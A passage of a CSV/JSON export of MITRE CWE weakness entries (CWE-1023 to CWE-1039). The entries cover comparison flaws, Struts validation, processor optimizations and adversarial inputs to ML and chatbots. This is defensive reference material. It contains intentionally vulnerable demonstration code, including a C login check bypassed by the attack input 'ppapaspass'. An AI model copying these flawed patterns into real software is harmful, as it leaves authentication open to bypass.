""Bad""}, {""code"": ""var newWindow = window.open(\""http://attacker-site.example.com/useful-page.html\"", \""_blank\"");newWindow.opener = null;"", ""language"": ""Good""}]}], ""categories"": [], ""likelihood"": ""Medium"", ""abstraction"": ""Variant"", ""description"": ""The web application produces links to untrusted external sites outside of its sphere of control, but it does not properly prevent the external site from modifying  security-critical properties of the window.opener object, such as the location property."", ""mitigations"": [{""phases"": ""Architecture and Design"", ""strategy"": """", ""description"": ""Specify in the design that any linked external document must not be granted access to the location object of the calling page."", ""effectiveness"": null}, {""phases"": ""Implementation"", ""strategy"": """", ""description"": ""When creating a link to an external document using the <a> tag with a defined target, for example \""_blank\"" or a named frame, provide the rel attribute with a value \""noopener noreferrer\"".\n                  If opening the external document in a new window via javascript, then reset the opener by setting it equal to null."", ""effectiveness"": null}, {""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Do not use \""_blank\"" targets. However, this can affect the usability of the application."", ""effectiveness"": null}], ""consequences"": [{""note"": ""The user may be redirected to an untrusted page that contains undesired content or malicious script code."", ""scope"": ""Confidentiality"", ""impact"": ""Alter Execution Logic""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": ""Specify in the design that any linked external document must not be granted access to the location object of the calling page.; When creating a link to an external document using the <a> tag with a defined target, for example \""_blank\"" or a named frame, provide the rel attribute with a value \""noopener noreferrer\"".\n                  If opening the external document in a new window via javascript, then reset the opener by setting it equal to null.; Do not use \""_blank\"" targets. However, this can affect the usability of the application."", ""detection_methods"": [{""method"": null, ""description"": ""Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \""sources\"" (origins of input) with \""sinks\"" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)"", ""effectiveness"": null}], ""extended_description"": ""When a user clicks a link to an external site (\""target\""), the target=\""_blank\"" attribute causes the target site's contents to be opened in a new window or tab, which runs in the same process as the original page. The window.opener object records information about the original page that offered the link.  If an attacker can run script on the target page, then they could read or modify certain properties of the window.opener object, including the location property - even if the original and target site are not the same origin.  An attacker can modify the location property to automatically redirect the user to a malicious site, e.g. as part of a phishing attack. Since this redirect happens in the original window/tab - which is not necessarily visible, since the browser is focusing the display on the new target page - the user might not notice any suspicious redirection.""}"
"CWE-1023","Incomplete Comparison with Missing Factors","The product performs a comparison between entities that must consider multiple factors or characteristics of each entity, but the comparison does not include one or more of these factors.","An incomplete comparison can lead to resultant weaknesses, e.g., by operating on the wrong object or making a security decision without considering a required factor.","Class","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Integrity, Access Control"", ""impact"": ""Alter Execution Logic, Bypass Protection Mechanism""}]","[{""phases"": ""Testing"", ""strategy"": """", ""description"": ""Thoroughly test the comparison scheme before deploying code into production. Perform positive testing as well as negative testing."", ""effectiveness"": null}]","[]","[{""cve_id"": ""CVE-2005-2782"", ""reference"": ""CVE-2005-2782"", ""description"": ""PHP remote file inclusion in web application that filters \""http\"" and \""https\"" URLs, but not \""ftp\"".""}, {""cve_id"": ""CVE-2014-6394"", ""reference"": ""CVE-2014-6394"", ""description"": ""Product does not prevent access to restricted directories due to partial string comparison with a public directory""}, {""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""public class Truck {private String make;private String model;private int year;\n                           public boolean equals(Object o) {if (o == null) return false;if (o == this) return true;if (!(o instanceof Truck)) return false;\n                                 Truck t = (Truck) o;\n                                 return (this.make.equals(t.getMake()) && this.model.equals(t.getModel()));}}"", ""language"": ""Bad""}]}, {""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""/* Ignore CWE-259 (hard-coded password) and CWE-309 (use of password system for authentication) for this example. */\n                     \n                     char *username = \""admin\"";char *pass = \""password\"";\n                     int AuthenticateUser(char *inUser, char *inPass) {if (strncmp(username, inUser, strlen(inUser))) {logEvent(\""Auth failure of username using strlen of inUser\"");return(AUTH_FAIL);}if (! strncmp(pass, inPass, strlen(inPass))) {logEvent(\""Auth success of password using strlen of inUser\"");return(AUTH_SUCCESS);}else {logEvent(\""Auth fail of password using sizeof\"");return(AUTH_FAIL);}}\n                     int main (int argc, char **argv) {int authResult;if (argc < 3) {ExitError(\""Usage: Provide a username and password\"");}authResult = AuthenticateUser(argv[1], argv[2]);if (authResult == AUTH_SUCCESS) {DoAuthenticatedTask(argv[1]);}else {ExitError(\""Authentication failed\"");}}"", ""language"": ""Bad""}, {""code"": ""ppapaspass"", ""language"": ""Attack""}]}]","","{""name"": ""Incomplete Comparison with Missing Factors"", ""cwe_id"": ""CWE-1023"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [{""cve_id"": ""CVE-2005-2782"", ""reference"": ""CVE-2005-2782"", ""description"": ""PHP remote file inclusion in web application that filters \""http\"" and \""https\"" URLs, but not \""ftp\"".""}, {""cve_id"": ""CVE-2014-6394"", ""reference"": ""CVE-2014-6394"", ""description"": ""Product does not prevent access to restricted directories due to partial string comparison with a public directory""}, {""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""public class Truck {private String make;private String model;private int year;\n                           public boolean equals(Object o) {if (o == null) return false;if (o == this) return true;if (!(o instanceof Truck)) return false;\n                                 Truck t = (Truck) o;\n                                 return (this.make.equals(t.getMake()) && this.model.equals(t.getModel()));}}"", ""language"": ""Bad""}]}, {""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""/* Ignore CWE-259 (hard-coded password) and CWE-309 (use of password system for authentication) for this example. */\n                     \n                     char *username = \""admin\"";char *pass = \""password\"";\n                     int AuthenticateUser(char *inUser, char *inPass) {if (strncmp(username, inUser, strlen(inUser))) {logEvent(\""Auth failure of username using strlen of inUser\"");return(AUTH_FAIL);}if (! strncmp(pass, inPass, strlen(inPass))) {logEvent(\""Auth success of password using strlen of inUser\"");return(AUTH_SUCCESS);}else {logEvent(\""Auth fail of password using sizeof\"");return(AUTH_FAIL);}}\n                     int main (int argc, char **argv) {int authResult;if (argc < 3) {ExitError(\""Usage: Provide a username and password\"");}authResult = AuthenticateUser(argv[1], argv[2]);if (authResult == AUTH_SUCCESS) {DoAuthenticatedTask(argv[1]);}else {ExitError(\""Authentication failed\"");}}"", ""language"": ""Bad""}, {""code"": ""ppapaspass"", ""language"": ""Attack""}]}], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Class"", ""description"": ""The product performs a comparison between entities that must consider multiple factors or characteristics of each entity, but the comparison does not include one or more of these factors."", ""mitigations"": [{""phases"": ""Testing"", ""strategy"": """", ""description"": ""Thoroughly test the comparison scheme before deploying code into production. Perform positive testing as well as negative testing."", ""effectiveness"": null}], ""consequences"": [{""note"": """", ""scope"": ""Integrity, Access Control"", ""impact"": ""Alter Execution Logic, Bypass Protection Mechanism""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": ""Thoroughly test the comparison scheme before deploying code into production. Perform positive testing as well as negative testing."", ""detection_methods"": [], ""extended_description"": ""An incomplete comparison can lead to resultant weaknesses, e.g., by operating on the wrong object or making a security decision without considering a required factor.""}"
"CWE-1024","Comparison of Incompatible Types","The product performs a comparison between two entities, but the entities are of different, incompatible types that cannot be guaranteed to provide correct results when they are directly compared.","In languages that are strictly typed but support casting/conversion, such as C or C++, the programmer might assume that casting one entity to the same type as another entity will ensure that the comparison will be performed correctly, but this cannot be guaranteed.  In languages that are not strictly typed, such as PHP or JavaScript, there may be implicit casting/conversion to a type that the programmer is unaware of, causing unexpected results; for example, the string ""123"" might be converted to a number type.  See examples.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Varies by Context""}]","[{""phases"": ""Testing"", ""strategy"": """", ""description"": ""Thoroughly test the comparison scheme before deploying code into production. Perform positive testing as well as negative testing."", ""effectiveness"": null}]","[]","[]","","{""name"": ""Comparison of Incompatible Types"", ""cwe_id"": ""CWE-1024"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The product performs a comparison between two entities, but the entities are of different, incompatible types that cannot be guaranteed to provide correct results when they are directly compared."", ""mitigations"": [{""phases"": ""Testing"", ""strategy"": """", ""description"": ""Thoroughly test the comparison scheme before deploying code into production. Perform positive testing as well as negative testing."", ""effectiveness"": null}], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Varies by Context""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": ""Thoroughly test the comparison scheme before deploying code into production. Perform positive testing as well as negative testing."", ""detection_methods"": [], ""extended_description"": ""In languages that are strictly typed but support casting/conversion, such as C or C++, the programmer might assume that casting one entity to the same type as another entity will ensure that the comparison will be performed correctly, but this cannot be guaranteed.  In languages that are not strictly typed, such as PHP or JavaScript, there may be implicit casting/conversion to a type that the programmer is unaware of, causing unexpected results; for example, the string \""123\"" might be converted to a number type.  See examples.""}"
"CWE-1025","Comparison Using Wrong Factors","The code performs a comparison between two entities, but the comparison examines the wrong factors or characteristics of the entities, which can lead to incorrect results and resultant weaknesses.","This can lead to incorrect results and resultant weaknesses.  For example, the code might inadvertently compare references to objects, instead of the relevant contents of those objects, causing two ""equal"" objects to be considered unequal.","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": """", ""scope"": ""Other"", ""impact"": ""Varies by Context""}]","[{""phases"": ""Testing"", ""strategy"": """", ""description"": ""Thoroughly test the comparison scheme before deploying code into production. Perform positive testing as well as negative testing."", ""effectiveness"": null}]","[]","[{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""String str1 = new String(\""Hello\"");String str2 = new String(\""Hello\"");if (str1 == str2) {System.out.println(\""str1 == str2\"");}"", ""language"": ""Bad""}, {""code"": ""if (str1.equals(str2)) {System.out.println(\""str1 equals str2\"");}"", ""language"": ""Good""}]}]","","{""name"": ""Comparison Using Wrong Factors"", ""cwe_id"": ""CWE-1025"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""String str1 = new String(\""Hello\"");String str2 = new String(\""Hello\"");if (str1 == str2) {System.out.println(\""str1 == str2\"");}"", ""language"": ""Bad""}, {""code"": ""if (str1.equals(str2)) {System.out.println(\""str1 equals str2\"");}"", ""language"": ""Good""}]}], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Base"", ""description"": ""The code performs a comparison between two entities, but the comparison examines the wrong factors or characteristics of the entities, which can lead to incorrect results and resultant weaknesses."", ""mitigations"": [{""phases"": ""Testing"", ""strategy"": """", ""description"": ""Thoroughly test the comparison scheme before deploying code into production. Perform positive testing as well as negative testing."", ""effectiveness"": null}], ""consequences"": [{""note"": """", ""scope"": ""Other"", ""impact"": ""Varies by Context""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": ""Thoroughly test the comparison scheme before deploying code into production. Perform positive testing as well as negative testing."", ""detection_methods"": [], ""extended_description"": ""This can lead to incorrect results and resultant weaknesses.  For example, the code might inadvertently compare references to objects, instead of the relevant contents of those objects, causing two \""equal\"" objects to be considered unequal.""}"
"CWE-103","Struts: Incomplete validate() Method Definition","The product has a validator form that either does not define a validate() method, or defines a validate() method but does not call super.validate().","If the code does not call super.validate(), the Validation Framework cannot check the contents of the form against a validation form. In other words, the validation framework will be disabled for the given form.","Variant","Draft","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": ""Disabling the validation framework for a form exposes the product to numerous types of attacks. Unchecked input is the root cause of vulnerabilities like cross-site scripting, process control, and SQL injection."", ""scope"": ""Other"", ""impact"": ""Other""}, {""note"": ""Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack."", ""scope"": ""Confidentiality, Integrity, Availability, Other"", ""impact"": ""Other""}]","[{""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Implement the validate() method and call super.validate() within that method."", ""effectiveness"": null}]","[{""method"": null, ""description"": ""Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \""sources\"" (origins of input) with \""sinks\"" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)"", ""effectiveness"": null}]","[{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {\n                     // private variables for registration formprivate String name;private String email;...\n                        public RegistrationForm() {super();}\n                        public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {ActionErrors errors = new ActionErrors();if (getName() == null || getName().length() < 1) {errors.add(\""name\"", new ActionMessage(\""error.name.required\""));}return errors;}\n                     \n                     // getter and setter methods for private variables...\n                     }"", ""language"": ""Bad""}, {""code"": ""public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {\n                     // private variables for registration formprivate String name;private String email;...\n                           public RegistrationForm() {super();}\n                           public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {ActionErrors errors = super.validate(mapping, request);if (errors == null) {errors = new ActionErrors();}\n                           \n                           if (getName() == null || getName().length() < 1) {errors.add(\""name\"", new ActionMessage(\""error.name.required\""));}return errors;}\n                     // getter and setter methods for private variables...}"", ""language"": ""Good""}]}]","","{""name"": ""Struts: Incomplete validate() Method Definition"", ""cwe_id"": ""CWE-103"", ""status"": ""Draft"", ""category"": """", ""examples"": [{""type"": ""demonstration"", ""title"": """", ""explanation"": """", ""introduction"": """", ""code_snippets"": [{""code"": ""public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {\n                     // private variables for registration formprivate String name;private String email;...\n                        public RegistrationForm() {super();}\n                        public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {ActionErrors errors = new ActionErrors();if (getName() == null || getName().length() < 1) {errors.add(\""name\"", new ActionMessage(\""error.name.required\""));}return errors;}\n                     \n                     // getter and setter methods for private variables...\n                     }"", ""language"": ""Bad""}, {""code"": ""public class RegistrationForm extends org.apache.struts.validator.ValidatorForm {\n                     // private variables for registration formprivate String name;private String email;...\n                           public RegistrationForm() {super();}\n                           public ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {ActionErrors errors = super.validate(mapping, request);if (errors == null) {errors = new ActionErrors();}\n                           \n                           if (getName() == null || getName().length() < 1) {errors.add(\""name\"", new ActionMessage(\""error.name.required\""));}return errors;}\n                     // getter and setter methods for private variables...}"", ""language"": ""Good""}]}], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Variant"", ""description"": ""The product has a validator form that either does not define a validate() method, or defines a validate() method but does not call super.validate()."", ""mitigations"": [{""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Implement the validate() method and call super.validate() within that method."", ""effectiveness"": null}], ""consequences"": [{""note"": ""Disabling the validation framework for a form exposes the product to numerous types of attacks. Unchecked input is the root cause of vulnerabilities like cross-site scripting, process control, and SQL injection."", ""scope"": ""Other"", ""impact"": ""Other""}, {""note"": ""Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack."", ""scope"": ""Confidentiality, Integrity, Availability, Other"", ""impact"": ""Other""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": ""Implement the validate() method and call super.validate() within that method."", ""detection_methods"": [{""method"": null, ""description"": ""Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \""sources\"" (origins of input) with \""sinks\"" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)"", ""effectiveness"": null}], ""extended_description"": ""If the code does not call super.validate(), the Validation Framework cannot check the contents of the form against a validation form. In other words, the validation framework will be disabled for the given form.""}"
"CWE-1037","Processor Optimization Removal or Modification of Security-critical Code","The developer builds a security-critical protection mechanism into the software, but the processor optimizes the execution of the program such that the mechanism is removed or modified.","","Base","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": ""A successful exploitation of this weakness will change the order of an application's execution and will likely be used to bypass specific protection mechanisms. This bypass can be exploited further to potentially read data that should otherwise be unaccessible."", ""scope"": ""Integrity"", ""impact"": ""Bypass Protection Mechanism""}]","[]","[{""method"": null, ""description"": ""In theory this weakness can be detected through the use of white box testing techniques where specifically crafted test cases are used in conjunction with debuggers to verify the order of statements being executed."", ""effectiveness"": null}]","[{""cve_id"": ""CVE-2017-5715"", ""reference"": ""CVE-2017-5715"", ""description"": ""Intel, ARM, and AMD processor optimizations related to speculative execution and branch prediction cause access control checks to be bypassed when placing data into the cache. Often known as \""Spectre\"".""}, {""cve_id"": ""CVE-2017-5753"", ""reference"": ""CVE-2017-5753"", ""description"": ""Intel, ARM, and AMD processor optimizations related to speculative execution and branch prediction cause access control checks to be bypassed when placing data into the cache. Often known as \""Spectre\"".""}, {""cve_id"": ""CVE-2017-5754"", ""reference"": ""CVE-2017-5754"", ""description"": ""Intel processor optimizations related to speculative execution cause access control checks to be bypassed when placing data into the cache. Often known as \""Meltdown\"".""}]","Low","{""name"": ""Processor Optimization Removal or Modification of Security-critical Code"", ""cwe_id"": ""CWE-1037"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [{""cve_id"": ""CVE-2017-5715"", ""reference"": ""CVE-2017-5715"", ""description"": ""Intel, ARM, and AMD processor optimizations related to speculative execution and branch prediction cause access control checks to be bypassed when placing data into the cache. Often known as \""Spectre\"".""}, {""cve_id"": ""CVE-2017-5753"", ""reference"": ""CVE-2017-5753"", ""description"": ""Intel, ARM, and AMD processor optimizations related to speculative execution and branch prediction cause access control checks to be bypassed when placing data into the cache. Often known as \""Spectre\"".""}, {""cve_id"": ""CVE-2017-5754"", ""reference"": ""CVE-2017-5754"", ""description"": ""Intel processor optimizations related to speculative execution cause access control checks to be bypassed when placing data into the cache. Often known as \""Meltdown\"".""}], ""categories"": [], ""likelihood"": ""Low"", ""abstraction"": ""Base"", ""description"": ""The developer builds a security-critical protection mechanism into the software, but the processor optimizes the execution of the program such that the mechanism is removed or modified."", ""mitigations"": [], ""consequences"": [{""note"": ""A successful exploitation of this weakness will change the order of an application's execution and will likely be used to bypass specific protection mechanisms. This bypass can be exploited further to potentially read data that should otherwise be unaccessible."", ""scope"": ""Integrity"", ""impact"": ""Bypass Protection Mechanism""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [""CAPEC-663""], ""mitigations_text"": """", ""detection_methods"": [{""method"": null, ""description"": ""In theory this weakness can be detected through the use of white box testing techniques where specifically crafted test cases are used in conjunction with debuggers to verify the order of statements being executed."", ""effectiveness"": null}], ""extended_description"": """"}"
"CWE-1038","Insecure Automated Optimizations","The product uses a mechanism that automatically optimizes code, e.g. to improve a characteristic such as performance, but the optimizations can have an unintended side effect that might violate an intended security assumption.","","Class","Draft","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": ""The optimizations alter the order of execution resulting in side effects that were not intended by the original developer."", ""scope"": ""Integrity"", ""impact"": ""Alter Execution Logic""}]","[]","[]","[{""cve_id"": ""CVE-2017-5715"", ""reference"": ""CVE-2017-5715"", ""description"": ""Intel, ARM, and AMD processor optimizations related to speculative execution and branch prediction cause access control checks to be bypassed when placing data into the cache. Often known as \""Spectre\"".""}, {""cve_id"": ""CVE-2008-1685"", ""reference"": ""CVE-2008-1685"", ""description"": ""C compiler optimization, as allowed by specifications, removes code that is used to perform checks to detect integer overflows.""}]","Low","{""name"": ""Insecure Automated Optimizations"", ""cwe_id"": ""CWE-1038"", ""status"": ""Draft"", ""category"": """", ""examples"": [{""cve_id"": ""CVE-2017-5715"", ""reference"": ""CVE-2017-5715"", ""description"": ""Intel, ARM, and AMD processor optimizations related to speculative execution and branch prediction cause access control checks to be bypassed when placing data into the cache. Often known as \""Spectre\"".""}, {""cve_id"": ""CVE-2008-1685"", ""reference"": ""CVE-2008-1685"", ""description"": ""C compiler optimization, as allowed by specifications, removes code that is used to perform checks to detect integer overflows.""}], ""categories"": [], ""likelihood"": ""Low"", ""abstraction"": ""Class"", ""description"": ""The product uses a mechanism that automatically optimizes code, e.g. to improve a characteristic such as performance, but the optimizations can have an unintended side effect that might violate an intended security assumption."", ""mitigations"": [], ""consequences"": [{""note"": ""The optimizations alter the order of execution resulting in side effects that were not intended by the original developer."", ""scope"": ""Integrity"", ""impact"": ""Alter Execution Logic""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": """", ""detection_methods"": [], ""extended_description"": """"}"
"CWE-1039","Inadequate Detection or Handling of Adversarial Input Perturbations in Automated Recognition Mechanism","The product uses an automated mechanism such as machine learning to recognize complex data inputs (e.g. image or audio) as a particular concept or category, but it does not properly detect or handle inputs that have been modified or constructed in a way that causes the mechanism to detect a different, incorrect concept.","When techniques such as machine learning are used to automatically classify input streams, and those classifications are used for security-critical decisions, then any mistake in classification can introduce a vulnerability that allows attackers to cause the product to make the wrong security decision or disrupt service of the automated mechanism.  If the mechanism is not developed or ""trained"" with enough input data or has not adequately undergone test and evaluation, then attackers may be able to craft malicious inputs that intentionally trigger the incorrect classification.
            Targeted technologies include, but are not necessarily limited to:
            automated speech recognition
               automated image recognition
               automated cyber defense
               Chatbot, LLMs, generative AI
            For example, an attacker might modify road signs or road surface markings to trick autonomous vehicles into misreading the sign/marking and performing a dangerous action. Another example includes an attacker that crafts highly specific and complex prompts to ""jailbreak"" a chatbot to bypass safety or privacy mechanisms, better known as prompt injection attacks.","Class","Incomplete","","{""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}","[{""note"": ""When the automated recognition is used in a protection mechanism, an attacker may be able to craft inputs that are misinterpreted in a way that grants excess privileges."", ""scope"": ""Integrity"", ""impact"": ""Bypass Protection Mechanism""}, {""note"": ""There could be disruption to the service of the automated recognition system, which could cause further downstream failures of the software."", ""scope"": ""Availability"", ""impact"": ""DoS: Resource Consumption (Other), DoS: Instability""}, {""note"": ""This weakness could lead to breaches of data privacy through exposing features of the training data, e.g., by using membership inference attacks or prompt injection attacks."", ""scope"": ""Confidentiality"", ""impact"": ""Read Application Data""}, {""note"": ""The consequences depend on how the application applies or integrates the affected algorithm."", ""scope"": ""Other"", ""impact"": ""Varies by Context""}]","[{""phases"": ""Architecture and Design"", ""strategy"": """", ""description"": ""Algorithmic modifications such as model pruning or compression can help mitigate this weakness. Model pruning ensures that only weights that are most relevant to the task are used in the inference of incoming data and has shown resilience to adversarial perturbed data."", ""effectiveness"": null}, {""phases"": ""Architecture and Design"", ""strategy"": """", ""description"": ""Consider implementing adversarial training, a method that introduces adversarial examples into the training data to promote robustness of algorithm at inference time."", ""effectiveness"": null}, {""phases"": ""Architecture and Design"", ""strategy"": """", ""description"": ""Consider implementing model hardening to fortify the internal structure of the algorithm, including techniques such as regularization and optimization to desensitize algorithms to minor input perturbations and/or changes."", ""effectiveness"": null}, {""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Consider implementing multiple models or using model ensembling techniques to improve robustness of individual model weaknesses against adversarial input perturbations."", ""effectiveness"": null}, {""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Incorporate uncertainty estimations into the algorithm that trigger human intervention or secondary/fallback software when reached. This could be when inference predictions and confidence scores are abnormally high/low comparative to expected model performance."", ""effectiveness"": null}, {""phases"": ""Integration"", ""strategy"": """", ""description"": ""Reactive defenses such as input sanitization, defensive distillation, and input transformations can all be implemented before input data reaches the algorithm for inference."", ""effectiveness"": null}, {""phases"": ""Integration"", ""strategy"": """", ""description"": ""Consider reducing the output granularity of the inference/prediction such that attackers cannot gain additional information due to leakage in order to craft adversarially perturbed data."", ""effectiveness"": null}]","[{""method"": null, ""description"": ""Use indicators from model performance deviations such as sudden drops in accuracy or unexpected outputs to verify the model."", ""effectiveness"": null}, {""method"": null, ""description"": ""Use indicators from input data collection mechanisms to verify that inputs are statistically within the distribution of the training and test data."", ""effectiveness"": null}, {""method"": null, ""description"": ""Use multiple models or model ensembling techniques to check for consistency of predictions/inferences."", ""effectiveness"": null}]","[]","","{""name"": ""Inadequate Detection or Handling of Adversarial Input Perturbations in Automated Recognition Mechanism"", ""cwe_id"": ""CWE-1039"", ""status"": ""Incomplete"", ""category"": """", ""examples"": [], ""categories"": [], ""likelihood"": """", ""abstraction"": ""Class"", ""description"": ""The product uses an automated mechanism such as machine learning to recognize complex data inputs (e.g. image or audio) as a particular concept or category, but it does not properly detect or handle inputs that have been modified or constructed in a way that causes the mechanism to detect a different, incorrect concept."", ""mitigations"": [{""phases"": ""Architecture and Design"", ""strategy"": """", ""description"": ""Algorithmic modifications such as model pruning or compression can help mitigate this weakness. Model pruning ensures that only weights that are most relevant to the task are used in the inference of incoming data and has shown resilience to adversarial perturbed data."", ""effectiveness"": null}, {""phases"": ""Architecture and Design"", ""strategy"": """", ""description"": ""Consider implementing adversarial training, a method that introduces adversarial examples into the training data to promote robustness of algorithm at inference time."", ""effectiveness"": null}, {""phases"": ""Architecture and Design"", ""strategy"": """", ""description"": ""Consider implementing model hardening to fortify the internal structure of the algorithm, including techniques such as regularization and optimization to desensitize algorithms to minor input perturbations and/or changes."", ""effectiveness"": null}, {""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Consider implementing multiple models or using model ensembling techniques to improve robustness of individual model weaknesses against adversarial input perturbations."", ""effectiveness"": null}, {""phases"": ""Implementation"", ""strategy"": """", ""description"": ""Incorporate uncertainty estimations into the algorithm that trigger human intervention or secondary/fallback software when reached. This could be when inference predictions and confidence scores are abnormally high/low comparative to expected model performance."", ""effectiveness"": null}, {""phases"": ""Integration"", ""strategy"": """", ""description"": ""Reactive defenses such as input sanitization, defensive distillation, and input transformations can all be implemented before input data reaches the algorithm for inference."", ""effectiveness"": null}, {""phases"": ""Integration"", ""strategy"": """", ""description"": ""Consider reducing the output granularity of the inference/prediction such that attackers cannot gain additional information due to leakage in order to craft adversarially perturbed data."", ""effectiveness"": null}], ""consequences"": [{""note"": ""When the automated recognition is used in a protection mechanism, an attacker may be able to craft inputs that are misinterpreted in a way that grants excess privileges."", ""scope"": ""Integrity"", ""impact"": ""Bypass Protection Mechanism""}, {""note"": ""There could be disruption to the service of the automated recognition system, which could cause further downstream failures of the software."", ""scope"": ""Availability"", ""impact"": ""DoS: Resource Consumption (Other), DoS: Instability""}, {""note"": ""This weakness could lead to breaches of data privacy through exposing features of the training data, e.g., by using membership inference attacks or prompt injection attacks."", ""scope"": ""Confidentiality"", ""impact"": ""Read Application Data""}, {""note"": ""The consequences depend on how the application applies or integrates the affected algorithm."", ""scope"": ""Other"", ""impact"": ""Varies by Context""}], ""relationships"": {""peers"": [], ""parents"": [], ""children"": [], ""requires"": [], ""canFollow"": [], ""canPrecede"": [], ""required_by"": [], ""alternatives"": []}, ""attack_patterns"": [], ""mitigations_text"": ""Algorithmic modifications such as model pruning or compression can help mitigate this weakness. Model pruning ensures that only weights that are most relevant to the task are used in the inference of incoming data and has shown resilience to adversarial perturbed data.; Consider implementing adversarial training, a method that introduces adversarial examples into the training data to promote robustness of algorithm at inference time.; Consider implementing model hardening to fortify the internal structure of the algorithm, including techniques such as regularization and optimization to desensitize algorithms to minor input perturbations and/or changes.; Consider implementing multiple models or using model ensembling techniques to improve robustness of individual model weaknesses against adversarial input perturbations.; Incorporate uncertainty estimations into the algorithm that trigger human intervention or secondary/fallback software when reached. This could be when inference predictions and confidence scores are abnormally high/low comparative to expected model performance.; Reactive defenses such as input sanitization, defensive distillation, and input transformations can all be implemented before input data reaches the algorithm for inference.; Consider reducing the output granularity of the inference/prediction such that attackers cannot gain additional information due to leakage in order to craft adversarially perturbed data."", ""detection_methods"": [{""method"": null, ""description"": ""Use indicators from model performance 